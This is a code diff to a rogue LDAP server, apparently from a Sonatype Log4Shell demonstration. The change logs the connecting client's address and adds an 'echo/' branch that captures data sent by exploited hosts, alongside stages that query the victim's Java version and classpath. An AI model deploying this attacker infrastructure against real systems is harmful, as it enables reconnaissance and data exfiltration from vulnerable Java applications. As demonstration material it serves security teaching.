@@ -1,6 +1,7 @@
 package com.sonatype.demo.log4shell.ldapserver;
 
 
+import com.sonatype.demo.log4shelldemo.helpers.LdapServerUploader;
 import com.unboundid.ldap.listener.interceptor.*;
 import com.unboundid.ldap.sdk.*;
 import org.slf4j.Logger;
@@ -61,10 +62,12 @@ public class Interceptor extends InMemoryOperationInterceptor {
     @Override
     public void processSearchResult(InMemoryInterceptedSearchResult result) {
 
+        String addr=result.getConnectedAddress();
+
         String key=result.getRequest().getBaseDN();
         log.info("search result for key {}",key);
 
-        CacheEntry ce=handleRequest(key);
+        CacheEntry ce=handleRequest(key,addr);
 
         Entry e=new Entry(ce.dn);
         for(Attribute a:ce.attributes) {
@@ -84,7 +87,7 @@ public class Interceptor extends InMemoryOperationInterceptor {
     }
 
 
-    public  CacheEntry handleRequest(String key) {
+    public  CacheEntry handleRequest(String key,String addr) {
 
 
 
@@ -97,21 +100,28 @@ public class Interceptor extends InMemoryOperationInterceptor {
             // starting conversation ..
             // request java version
            log.info("ask for version");
-            return cache.get("cn=version");
+            return cache.get("cn=getversion");
 
         }
 
+        if(key.startsWith("echo/")) {
+            String data=key.substring(5);
+            LdapServerUploader.upload("cn=echo",addr+" sent us "+data);
+            return cache.get("cn=echo");
 
+
+
+        }
         if(key.startsWith("version/")) {
             System.out.println(key);
             System.out.println("ask for classpath");
-            return cache.get("cn=classpath");
+            return cache.get("cn=getclasspath");
 
         }
 
         if(key.startsWith("classpath/")) {
             System.out.println(key);
-            return cache.get("cn=thankyou");
+            return cache.get("cn=saythankyou");
 
         }
 
